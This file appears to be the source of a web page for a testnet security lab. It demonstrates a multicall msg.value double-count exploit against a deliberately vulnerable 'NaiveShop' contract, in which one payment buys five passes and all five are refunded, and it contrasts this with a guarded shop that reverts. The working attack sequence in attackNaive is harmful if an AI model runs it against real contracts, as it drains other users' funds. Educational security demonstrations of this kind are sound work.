"use client";
import { useCallback, useEffect, useState } from "react";
import { type Abi, type Address, type Hex, encodeFunctionData } from "viem";
import { AnimatePresence, motion } from "motion/react";
import { useWallet } from "@/components/Wallet";
import { Flip, Icon, Mark, Page, ease } from "@/components/ui";
import { DEPLOYMENT, txUrl } from "@/lib/config";
import { naiveAbi, shopAbi } from "@/lib/contracts";
import { publicClient } from "@/lib/client";
import { friendly } from "@/lib/errors";
import { eth } from "@/lib/format";

const ENTRIES = 5;
/** What each lab contract holds from 9 honest 0.001 ETH purchases. */
const HONEST = 9_000_000_000_000_000n;

type Side = { name: string; address?: Address; abi: Abi; balance: bigint; minted: bigint; price: bigint };
type Result = { ok: boolean; lines: string[]; hashes: Hex[] };

async function sideState(name: string, address: Address | undefined, abi: Abi, naive: boolean): Promise<Side> {
  if (!address) return { name, abi, balance: 0n, minted: 0n, price: 0n };
  const [balance, minted, price] = await Promise.all([
    publicClient.getBalance({ address }),
    publicClient.readContract({ address, abi, functionName: "totalMinted" }) as Promise<bigint>,
    naive ? Promise.resolve(1_000_000_000_000_000n) : ((publicClient.readContract({ address, abi, functionName: "itemOf", args: [0n] }) as Promise<{ price: bigint }>).then((i) => i.price)),
  ]);
  return { name, address, abi, balance, minted, price };
}

export default function Lab() {
  const w = useWallet();
  const [naive, setNaive] = useState<Side>();
  const [till, setTill] = useState<Side>();
  const [res, setRes] = useState<Record<string, Result>>({});
  const [busy, setBusy] = useState<string | null>(null);

  const reload = useCallback(async () => {
    setNaive(await sideState("NaiveShop", DEPLOYMENT.naiveShop, naiveAbi, true));
    setTill(await sideState("Till Shop", DEPLOYMENT.labShop, shopAbi, false));
  }, []);
  useEffect(() => void reload(), [reload]);

  const batch = (abi: Abi) => encodeFunctionData({ abi, functionName: "multicall", args: [Array.from({ length: ENTRIES }, () => encodeFunctionData({ abi, functionName: "buy", args: [0n, 1n] }))] });

  // Restock NaiveShop with one honest purchase (value == price * qty) until it
  // holds `target`. On a shared testnet every attack drains 0.004 ETH, so this
  // keeps the lab runnable for the next visitor.
  const restock = async (side: Side, target: bigint): Promise<{ hash: Hex; qty: bigint } | null> => {
    if (!side.address || side.balance >= target) return null;
    const qty = (target - side.balance + side.price - 1n) / side.price;
    const hash = await w.write(`Restock NaiveShop: ${qty} honest purchase${qty === 1n ? "" : "s"}`, {
      address: side.address,
      abi: naiveAbi,
      functionName: "buy",
      args: [0n, qty],
      value: side.price * qty,
    });
    return hash ? { hash, qty } : null;
  };

  const attackNaive = async () => {
    if (!naive?.address) return;
    setBusy("naive");
    const lines: string[] = [];
    const hashes: Hex[] = [];
    // The refunds need (ENTRIES - 1) prices on top of Mallory's one payment.
    let side = naive;
    if (side.balance < side.price * BigInt(ENTRIES - 1)) {
      const r = await restock(side, HONEST);
      if (!r) return setBusy(null);
      lines.push(`Earlier visitors had drained the shop, so an honest buyer restocked it first (${r.qty} purchases).`);
      hashes.push(r.hash);
      side = await sideState("NaiveShop", naive.address, naiveAbi, true);
    }
    const before = side.balance;
    const first = side.minted + 1n;
    lines.push(`Pay ${eth(side.price)} ETH once, batch ${ENTRIES} buys of ${eth(side.price)} ETH`);
    const h1 = await w.write("Attack: batched buys", { address: side.address!, abi: naiveAbi, functionName: "multicall", args: [(decodeArgs(batch(naiveAbi)))], value: side.price });
    if (!h1) return setBusy(null);
    const refunds = Array.from({ length: ENTRIES }, (_, i) => encodeFunctionData({ abi: naiveAbi, functionName: "refund", args: [first + BigInt(i)] }));
    const h2 = await w.write(`Attack: refund ${ENTRIES} passes`, { address: side.address!, abi: naiveAbi, functionName: "multicall", args: [refunds] });
    const after = await publicClient.getBalance({ address: side.address! });
    lines.push(`Got ${ENTRIES} passes for one payment, refunded all ${ENTRIES}.`);
    lines.push(`Shop balance ${eth(before)} → ${eth(after)} ETH: ${eth(before - after)} ETH of other buyers' money is now yours.`);
    setRes((r) => ({ ...r, naive: { ok: !!h2, lines, hashes: [...hashes, h1, ...(h2 ? [h2] : [])] } }));
    setBusy(null);
    void reload();
  };

  const putBack = async () => {
    if (!naive?.address) return;
    setBusy("naive-restock");
    const r = await restock(naive, HONEST);
    if (r) {
      setRes((x) => ({
        ...x,
        naive: { ok: true, lines: [...(x.naive?.lines ?? []), `Put it back: ${r.qty} honest purchases refilled the shop to ${eth(HONEST)} ETH for the next visitor.`], hashes: [...(x.naive?.hashes ?? []), r.hash] },
      }));
    }
    setBusy(null);
    void reload();
  };

  const attackTill = async () => {
    if (!till?.address || !w.address) return;
    setBusy("till");
    const lines = [`Pay ${eth(till.price)} ETH once, batch ${ENTRIES} buys of ${eth(till.price)} ETH`];
    try {
      await publicClient.simulateContract({ account: w.address, address: till.address, abi: shopAbi, functionName: "multicall", args: [decodeArgs(batch(shopAbi))], value: till.price });
      lines.push("Unexpected: the batch would succeed.");
      setRes((r) => ({ ...r, till: { ok: true, lines, hashes: [] } }));
    } catch (e) {
      const f = friendly(e);
      lines.push(`Reverted with ${f.code ?? "an error"}: ${f.title}.`);
      lines.push("Nothing was charged and no pass was minted.");
      setRes((r) => ({ ...r, till: { ok: false, lines, hashes: [] } }));
    }
    setBusy(null);
  };

  const sendAnyway = async () => {
    if (!till?.address) return;
    setBusy("till-raw");
    if (w.balance < till.price * 2n) await w.faucet({ silent: true });
    try {
      const r = await w.sendRaw(till.address, batch(shopAbi), till.price, 1_500_000n);
      setRes((x) => ({ ...x, till: { ok: false, lines: [...(x.till?.lines ?? []), `Sent on-chain anyway: ${r.status}. The value went back with the revert.`], hashes: [r.hash] } }));
    } catch (e) {
      setRes((x) => ({ ...x, till: { ok: false, lines: [...(x.till?.lines ?? []), friendly(e).title], hashes: [] } }));
    }
    setBusy(null);
    void reload();
  };

  if (!DEPLOYMENT.naiveShop || !DEPLOYMENT.labShop) return <p className="card">The lab contracts are not deployed on this network.</p>;

  return (
    <Page className="space-y-8">
      <section className="grain relative overflow-hidden rounded-[1.8rem] bg-ink p-6 text-paper sm:p-9">
        <div aria-hidden className="absolute -right-16 -top-24 h-72 w-72 animate-drift rounded-full bg-alarm-500/25 blur-3xl" />
        <div aria-hidden className="absolute -bottom-28 -left-10 h-72 w-72 animate-drift-slow rounded-full bg-till-500/25 blur-3xl" />
        <div className="relative">
          <p className="pill bg-alarm-500/20 text-alarm-400">Security demo · testnet only</p>
          <h1 className="mt-4 text-4xl font-black tracking-tight sm:text-5xl">The double-count, live</h1>
          <p className="mt-3 max-w-2xl text-paper/70">
            Both contracts sell the same 0.001 ETH ticket and each holds 9 honest purchases. You play Mallory: pay once, batch {ENTRIES} buys with
            std&apos;s multicall, then refund. <code className="rounded bg-white/10 px-1.5">NaiveShop</code> follows the std doc example (a{" "}
            <code className="rounded bg-white/10 px-1.5">#[payable]</code> multicall next to handlers that trust <code className="rounded bg-white/10 px-1.5">ctx.value()</code>); the Till shop draws every entry from one budget.
          </p>
        </div>
      </section>

      <div className="grid gap-4 md:grid-cols-2">
        {[
          { side: naive, key: "naive", run: attackNaive, accent: "alarm" },
          { side: till, key: "till", run: attackTill, accent: "till" },
        ].map(({ side, key, run, accent }) => {
          const r = res[key];
          const pct = side ? Math.min(100, Number((side.balance * 100n) / HONEST)) : 100;
          return (
            <motion.section key={key} layout className={`card relative overflow-hidden ${accent === "alarm" ? "border-alarm-400/30" : "border-till-400/40"}`} data-testid={`lab-${key}`}>
              <div className="flex items-center gap-3">
                <span className={`grid h-11 w-11 place-items-center rounded-2xl ${accent === "alarm" ? "bg-alarm-500/10 text-alarm-600" : "bg-till-50 text-till-700"}`}>
                  <Icon name={accent === "alarm" ? "coins" : "shield"} className="h-6 w-6" />
                </span>
                <div>
                  <h2 className="text-xl font-black">{side?.name ?? "…"}</h2>
                  <p className="text-xs text-ink/50">{accent === "alarm" ? "std multicall + ctx.value()" : "metered_multicall + TransientTill"}</p>
                </div>
              </div>
              <div className="mt-5">
                <div className="flex items-baseline justify-between text-sm">
                  <span className="text-ink/55">Contract balance</span>
                  <span className="num text-lg font-bold" data-testid={`lab-${key}-balance`}>{side ? eth(side.balance) : "…"} ETH</span>
                </div>
                <div className="mt-2 h-2.5 overflow-hidden rounded-full bg-ink/[.06]">
                  <motion.div className={`h-full rounded-full ${accent === "alarm" ? "bg-gradient-to-r from-alarm-500 to-brass-400" : "bg-gradient-to-r from-till-500 to-lime-400"}`} animate={{ width: `${pct}%` }} transition={{ duration: 0.9, ease }} />
                </div>
                <div className="mt-2 flex justify-between text-sm">
                  <span className="text-ink/55">Passes minted</span>
                  <span className="num font-semibold"><Flip k={side?.minted.toString() ?? "-"}>{side?.minted.toString() ?? "…"}</Flip></span>
                </div>
              </div>
              <motion.button whileTap={{ scale: 0.97 }} data-testid={`attack-${key}`} className={`${key === "naive" ? "btn-danger" : "btn-primary"} mt-5 w-full`} disabled={!!busy || !side?.address || (key === "till" && !w.address)} onClick={() => void run()}>
                {busy === key ? (
                  <><span className="h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent motion-reduce:animate-none" /> Running…</>
                ) : (
                  <>Run the attack on {side?.name ?? ""}</>
                )}
              </motion.button>
              <AnimatePresence>
                {r && (
                  <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: "auto" }} transition={{ duration: 0.4, ease }} className="overflow-hidden">
                    <div className={`mt-4 rounded-2xl p-4 text-sm ${r.ok && key === "naive" ? "bg-alarm-500/[.07]" : "bg-till-50"}`} data-testid={`lab-${key}-result`}>
                      <div className="mb-2 flex items-center gap-2">
                        <Mark ok={key !== "naive"} size={28} />
                        <span className="font-bold">{key === "naive" ? "Drained" : "Reverted"}</span>
                      </div>
                      {r.lines.map((l, i) => (
                        <motion.p key={i} initial={{ opacity: 0, x: -6 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.08 * i }} className="py-0.5 leading-relaxed">
                          {l}
                        </motion.p>
                      ))}
                      {r.hashes.map((h) => {
                        const u = txUrl(h);
                        return u ? (
                          <a key={h} href={u} className="mt-1 block font-semibold text-till-700 underline" target="_blank" rel="noreferrer">View {h.slice(0, 10)}…</a>
                        ) : (
                          <p key={h} className="num mt-1 break-all text-[11px] text-ink/45">{h}</p>
                        );
                      })}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
              {key === "naive" && r?.ok && side && side.balance < HONEST && (
                <button data-testid="restock-naive" className="btn-ghost mt-3 w-full text-sm" disabled={!!busy} onClick={() => void putBack()}>
                  {busy === "naive-restock" ? "Putting it back…" : `Put ${eth(HONEST - side.balance)} ETH back for the next visitor`}
                </button>
              )}
              {key === "till" && r && !r.hashes.length && (
                <button className="btn-ghost mt-3 w-full text-sm" disabled={!!busy} onClick={() => void sendAnyway()}>Send it on-chain anyway (to see the reverted tx)</button>
              )}
            </motion.section>
          );
        })}
      </div>

      <section className="card text-sm leading-relaxed text-ink/70">
        <h2 className="text-lg font-bold text-ink">What happened</h2>
        <p className="mt-1">
          Every multicall entry is a <code>DELEGATECALL</code> that sees the batch&apos;s full <code>msg.value</code>. NaiveShop checks <code>msg.value == price</code> five times against the same payment. Till opens one budget of <code>msg.value</code> for the batch; the first buy draws it to zero and the second fails with <code>Overspend</code>.
        </p>
      </section>
    </Page>
  );
}

/** multicall(bytes[]) args back out of the encoded call (so both sides share `batch`). */
function decodeArgs(data: Hex): Hex[] {
  const body = data.slice(10);
  const n = Number(BigInt(`0x${body.slice(64, 128)}`));
  const out: Hex[] = [];
  for (let i = 0; i < n; i++) {
    const off = Number(BigInt(`0x${body.slice(128 + i * 64, 192 + i * 64)}`)) * 2 + 128;
    const len = Number(BigInt(`0x${body.slice(off, off + 64)}`));
    out.push(`0x${body.slice(off + 64, off + 64 + len * 2)}` as Hex);
  }
  return out;
}
